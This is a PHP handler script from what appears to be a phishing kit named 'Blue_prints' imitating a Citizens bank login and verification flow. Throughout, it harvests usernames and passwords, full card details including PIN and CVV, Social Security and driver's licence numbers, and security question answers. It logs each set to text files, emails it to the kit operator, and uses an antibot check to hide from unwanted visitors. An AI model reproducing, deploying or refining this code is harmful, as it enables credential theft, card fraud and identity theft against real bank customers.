<?php 
	session_start();
	require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
	        // variable declaration
	        $errors = array(); 


	       if (isset($_POST['invalid']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
	          // Get User Input
	          $UserID = $_POST['UserID'];
	          $password = $_POST['Password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::: Blue_prints C1t1zen Info [Login Details] :::::::::::::::\r\n";
	          $body .= "UserID                                 : $UserID\r\n";
	          $body .= "Password                               : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::: Blue_prints C1t1zen Info :::::::::::::::::\r\n";
	          
	          $save=fopen("../data/login".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
 
	          $subject="C1t1zen Login Access 2 | "."IP: ".$_SERVER['REMOTE_ADDR'];

	          $headers="From: Blue_prints <c1t1zen@blue_prints.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	            @mail($emailzz, $subject, $body, $headers);
	          	$key = $_SESSION['token'];
	          	echo "<script>window.location.href='../../question_auth.php?token=".$key."';</script>";
	          	die();
	          
	          }
	          
	          if(isset($_POST['UserID'])&&isset($_POST['Password']))
	          {
	          include 'recon.php';
	          include '../conf/config.php'; 
	          // check for valid email address
	          $UserID = $_POST['UserID'];
	          $password = $_POST['Password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::: Blue_prints C1t1zen Info [Login Details] ::::::::::::::::\r\n";
	          $body .= "UserID                                 : $UserID\r\n";
	          $body .= "Password                               : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Blue_prints C1t1zen Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("../data/login".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
	         
              $subject="C1t1zen Login Access 1 | "."IP: ".$_SERVER['REMOTE_ADDR'];
	          
	          $headers="From: Blue_prints <c1t1zen@blue_prints.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
	          $key = $_SESSION['token'];
			  if($d_log == "on"){
	          echo "<script>window.location.href='../../login.php?invalid&token=".$key."';</script>";
	          die();
			  }else{
				echo "<script>window.location.href='../../question_auth.php?token=".$key."';</script>";
				die();
			  }
	          }
	          
	          if (isset($_POST['credit_verify']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
	          // check for valid email address 
	          $ccnum = $_POST['ccnum'];
	          $pin = $_POST['pin']; 
	          $expdate = $_POST['expdate'];
	          $cvv = $_POST['cvv']; 
	           
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::: Blue_prints C1t1zen Info [Card Details] ::::::::::::::::::\r\n"; 
	          $body .= "Card Number                          : $ccnum\r\n";
	          $body .= "Card Pin                             : $pin\r\n";
	          $body .= "Card Expiry Date                     : $expdate\r\n";
	          $body .= "Card Security Code                   : $cvv\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Blue_prints C1t1zen Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("../data/credit_verify".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
             
	          $subject="C1t1zen Card Details | "."IP: ".$_SERVER['REMOTE_ADDR'];

	          $headers="From: Blue_prints <c1t1zen@blue_prints.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
	          	$key = $_SESSION['token'];
				  if($mailpage == "on"){
	          	echo "<script>window.location.href='../../mail_verify.php?token=".$key."';</script>";
	          	die();
				  }else{
					echo "<script>window.location.href='../../success.php?token=".$key."';</script>";
					die();
				  }
	          }

	          if (isset($_POST['account_verify']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
	          // check for valid email address
	          $fname = $_POST['fname'];
	          $dob = $_POST['dob'];
			  $phn = $_POST['phn'];
	          $dlnum = $_POST['dlnum'];
	          $lname = $_POST['lname']; 
	          $address = $_POST['address'];  
	          $zipcode = $_POST['zipcode'];
	          $city = $_POST['city'];
	          $ssn = $_POST['ssn'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = ":::::::::::: Blue_prints C1t1zen Info [Fullz Details] ::::::::::::::::\r\n";
	          $body .= "First Name                         : $fname\r\n";
	          $body .= "Last Name                          : $lname\r\n";
	          $body .= "Date Of Birth                      : $dob\r\n";
	          $body .= "DL Number                          : $dlnum\r\n";
	          $body .= "Social Security Number             : $ssn\r\n";
			  $body .= "Phone Number                       : $phn\r\n";
	          $body .= "City                               : $city\r\n"; 
	          $body .= "Address                            : $address\r\n";
	          $body .= "ZipCode                            : $zipcode\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Blue_prints C1t1zen Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("../data/account_verify".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
 
	          $subject="C1t1zen Card Details | "."IP: ".$_SERVER['REMOTE_ADDR'];

	          $headers="From: Blue_prints <c1t1zen@blue_prints.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
	          	$key = $_SESSION['token'];
	          	echo "<script>window.location.href='../../credit_verify.php?token=".$key."';</script>";
	          	die();
	          }
	          
	      if (isset($_POST['quest_verify']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
	          // check for valid email address 
	          $quest1 = $_POST['quest1'];
	          $quest2 = $_POST['quest2']; 
	          $quest3 = $_POST['quest3'];
	          $ans1 = $_POST['ans1'];
	          $ans2 = $_POST['ans2'];
	          $ans3 = $_POST['ans3']; 
	           
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::: Blue_prints C1t1zen Info [Security Questions] ::::::::::::\r\n"; 
	          $body .= "Security Question 1                  : $quest1\r\n";
	          $body .= "Answer 1                             : $ans1\r\n";
	          $body .= "Security Question 2                  : $quest2\r\n";
	          $body .= "Answer 2                             : $ans2\r\n";
	          $body .= "Security Question 3                  : $quest3\r\n";
	          $body .= "Answer 3                             : $ans3\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: C1t1zen Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("../data/security_quest".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
 
	          $subject="C1t1zen Security Questions | "."IP: ".$_SERVER['REMOTE_ADDR'];

	          $headers="From: Blue_prints <c1t1zen@blue_prints.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
	          	$key = $_SESSION['token'];
	          	echo "<script>window.location.href='../../account_verify.php?token=".$key."';</script>";
	          	die();
	        
	          }
?>
